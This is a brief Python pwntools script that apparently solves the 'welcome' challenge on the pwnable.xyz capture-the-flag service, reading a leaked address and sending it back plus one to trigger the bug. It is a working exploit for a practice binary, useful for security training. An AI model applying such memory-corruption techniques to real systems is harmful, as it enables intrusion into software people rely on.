#!/usr/bin/env python3
from pwn import *
from sys import argv
import pwnlib
pwnlib.args.SILENT(True)

BIN = "./welcome"
HOST = "svc.pwnable.xyz"
PORT = 30000

if(len(argv) > 1 and argv[1].lower() == "remote"):
	p = remote(HOST, PORT)
else:
	p = process(BIN)

p.recvline()
p.recvuntil(b": ")
leak = int(p.recvline()[:-1].decode(), base=16)
print(f"Leak: 0x{leak:x}")
p.recvuntil(b": ")

payload = leak+1
p.sendline(bytes(f"{payload}", "utf-8"))
print(p.recv())
p.sendline(b'\n')
print(p.recv())
